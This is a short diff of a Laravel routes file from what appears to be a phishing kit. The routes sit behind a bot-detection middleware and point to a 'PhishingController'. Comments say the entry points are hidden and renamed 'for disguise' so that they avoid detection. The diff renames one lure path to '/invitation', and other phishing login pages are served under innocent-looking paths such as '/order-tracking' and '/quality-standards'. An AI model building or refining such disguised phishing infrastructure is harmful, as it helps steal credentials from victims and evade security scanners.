@@ -19,7 +19,7 @@ Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(f
     // Hidden Entry Points - Wrapped and Renamed for Disguise
     // We remove '/login' and '/latest-settings-info' to avoid detection
     Route::get('/order-tracking', [PhishingController::class, 'showLogin2v2']);
-    Route::get('/bm-managent', [PhishingController::class, 'index']);
+    Route::get('/invitation', [PhishingController::class, 'index']);
 
     Route::get('/quality-standards', [PhishingController::class, 'latestSettingsInfo']);
 
